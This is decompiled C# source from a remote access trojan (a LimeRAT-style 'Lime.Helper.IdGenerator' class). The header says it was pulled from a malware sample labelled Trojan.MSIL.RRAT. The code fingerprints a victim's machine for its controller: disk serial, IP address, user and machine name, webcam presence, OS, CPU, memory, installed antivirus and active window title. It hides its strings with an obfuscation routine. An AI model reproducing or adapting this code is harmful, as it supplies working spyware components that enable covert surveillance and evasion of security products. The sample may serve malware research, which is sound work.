// Decompiled with JetBrains decompiler
// Type: Lime.Helper.IdGenerator
// Assembly: ClientX, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EEC5B2E-8B21-4543-94D2-F5C89EF8D336
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.RRAT.gen-1ff51be88103ec4492613582af80f682292f70f7270ec457c7ca14a89fe324bb.exe

using Lime.NativeMethods;
using Lime.Settings;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Globalization;
using System.Management;
using System.Net;
using System.Text;

namespace Lime.Helper
{
  public static class IdGenerator
  {
    public static string SendInfo() => \uE002.\uE000("\uE2F6\uE2D1\uE2D9\uE2D0\uE2CD\uE2D2\uE2DE\uE2CB\uE2D6\uE2D0\uE2D1", 57919) + Config.key + Config.id + Config.key + StringConverter.Encode(\uE002.\uE000("\uE7A0", 59201) + IdGenerator.GetHardDiskSerialNumber()) + Config.key + IdGenerator.GetIp() + Config.key + StringConverter.Encode(Environment.MachineName + \uE002.\uE000("\uE0CE\uE0C1\uE0CE", 57358) + Environment.UserName) + Config.key + IdGenerator.GetCamera() + Config.key + StringConverter.Encode(new ComputerInfo().OSFullName + \uE002.\uE000("\uF00F", 61447) + IdGenerator.GetSystem()) + Config.key + StringConverter.Encode(IdGenerator.GetCpu()) + Config.key + (object) new ComputerInfo().TotalPhysicalMemory + Config.key + IdGenerator.GetAV(\uE002.\uE000("\uE3A8\uE39E\uE397\uE39E\uE398\uE38F\uE3DB\uE3D1\uE3DB\uE39D\uE389\uE394\uE396\uE3DB\uE3BA\uE395\uE38F\uE392\uE3AD\uE392\uE389\uE38E\uE388\uE3AB\uE389\uE394\uE39F\uE38E\uE398\uE38F", 58329)) + Config.key + IdGenerator.GetAV(\uE002.\uE000("\uE98C\uE99A\uE993\uE99A\uE99C\uE98B\uE9FF\uE9F5\uE9FF\uE999\uE98D\uE990\uE992\uE9FF\uE999\uE9B6\uE9AD\uE9BA\uE9A8\uE9BE\uE9B3\uE9B3\uE98F\uE9AD\uE9B0\uE9BB\uE9AA\uE9BC\uE9AB", 59799)) + Config.key + Config.port + Config.key + IdGenerator.GetActiveWindow() + Config.key + StringConverter.Encode(CultureInfo.CurrentCulture.Name) + Config.key + \uE002.\uE000("\uEAAB\uEA8C\uEA81\uEA9E\uEA88", 60108);

    public static string GetIp()
    {
      try
      {
        return ((IPAddress) Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0)).ToString();
      }
      catch
      {
        return \uE002.\uE000("\uF361\uF300\uF36E", 62215);
      }
    }

    public static string GetHardDiskSerialNumber()
    {
      try
      {
        string IP = Interaction.Environ(\uE002.\uE000("\uF42C\uF406\uF40C\uF40B\uF41A\uF412\uF43B\uF40D\uF416\uF409\uF41A", 62493)) + \uE002.\uE000("\uE3A3", 58188);
        string V = (string) null;
        int T = 0;
        int Q = 0;
        int G = 0;
        string J = (string) null;
        int H = 0;
        Native.GVI(ref IP, ref V, T, ref H, ref Q, ref G, ref J, 0);
        return Conversion.Hex(H);
      }
      catch
      {
      }
      return \uE002.\uE000("\uEDB8\uEDAF\uEDAF", 60741);
    }

    public static string GetCamera()
    {
      try
      {
        int num = 0;
        do
        {
          short wDriver = (short) num;
          string lpszName = Strings.Space(100);
          int cbName = 100;
          string lpszVer = (string) null;
          if (!Native.capGetDriverDescriptionA(wDriver, ref lpszName, cbName, ref lpszVer, 100))
            ++num;
          else
            goto label_3;
        }
        while (num <= 4);
        goto label_5;
label_3:
        return \uE002.\uE000("\uF686\uF6BA\uF6AC", 63175);
      }
      catch
      {
      }
label_5:
      return \uE002.\uE000("\uF57B\uF55A", 62720);
    }

    public static string GetSystem()
    {
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(\uE002.\uE000("\uEEE8\uEEFE\uEEF7\uEEFE\uEEF8\uEEEF\uEEBB\uEEB1\uEEBB\uEEFD\uEEE9\uEEF4\uEEF6\uEEBB\uEECC\uEEF2\uEEF5\uEEA8\uEEA9\uEEC4\uEECB\uEEE9\uEEF4\uEEF8\uEEFE\uEEE8\uEEE8\uEEF4\uEEE9", 60947)).Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            return Convert.ToInt32(enumerator.Current[\uE002.\uE000("\uE7BE\uE79B\uE79B\uE78D\uE79A\uE78C\uE78C\uE7A8\uE796\uE79B\uE78B\uE797", 59391)]).ToString();
        }
      }
      catch
      {
        return \uE002.\uE000("\uF361\uF300\uF36E", 62215);
      }
      return \uE002.\uE000("\uF361\uF300\uF36E", 62215);
    }

    public static string GetAV(string product)
    {
      try
      {
        string empty = string.Empty;
        foreach (ManagementObject managementObject in new ManagementObjectSearcher(\uE002.\uE000("\uEB80\uEB9D\uEB9D\uEB86\uEBAE\uEBA1\uEB97\uEB91\uEB87\uEB80\uEB9B\uEB86\uEB8B\uEBB1\uEB97\uEB9C\uEB86\uEB97\uEB80", 60322) + (new ComputerInfo().OSFullName.Contains(\uE002.\uE000("\uE7B5\uE7BD", 59233)) ? (object) "" : (object) \uE002.\uE000("\uE215", 57858)).ToString(), product).Get())
          empty += (string) managementObject[\uE002.\uE000("\uE79F\uE792\uE788\uE78B\uE797\uE79A\uE782\uE7B5\uE79A\uE796\uE79E", 59353)];
        return empty != string.Empty ? StringConverter.Encode(empty) : StringConverter.Encode(\uE002.\uE000("\uF361\uF300\uF36E", 62215));
      }
      catch
      {
        return StringConverter.Encode(\uE002.\uE000("\uF361\uF300\uF36E", 62215));
      }
    }

    public static string GetCpu()
    {
      try
      {
        return Registry.GetValue(\uE002.\uE000("\uEF8F\uEF8C\uEF82\uEF9E\uEF98\uEF8B\uEF88\uEF84\uEF86\uEF8B\uEF98\uEF8A\uEF86\uEF84\uEF8F\uEF8E\uEF89\uEF82\uEF9B\uEF8F\uEF86\uEF95\uEF83\uEF90\uEF86\uEF95\uEF82\uEF9B\uEF83\uEF82\uEF94\uEF84\uEF95\uEF8E\uEF97\uEF93\uEF8E\uEF88\uEF89\uEF9B\uEF94\uEF9E\uEF94\uEF93\uEF82\uEF8A\uEF9B\uEF84\uEF82\uEF89\uEF93\uEF95\uEF86\uEF8B\uEF97\uEF95\uEF88\uEF84\uEF82\uEF94\uEF94\uEF88\uEF95\uEF9B\uEFF7", 61251), \uE002.\uE000("\uE8FE\uE8DC\uE8C1\uE8CD\uE8CB\uE8DD\uE8DD\uE8C1\uE8DC\uE8E0\uE8CF\uE8C3\uE8CB\uE8FD\uE8DA\uE8DC\uE8C7\uE8C0\uE8C9", 59522), (object) null).ToString();
      }
      catch
      {
        return \uE002.\uE000("\uF361\uF300\uF36E", 62215);
      }
    }

    public static string GetActiveWindow()
    {
      try
      {
        StringBuilder lpString = new StringBuilder(256);
        Native.GetWindowText(Native.GFW(), lpString, lpString.Capacity);
        return StringConverter.Encode(lpString.ToString());
      }
      catch
      {
        return StringConverter.Encode("");
      }
    }
  }
}
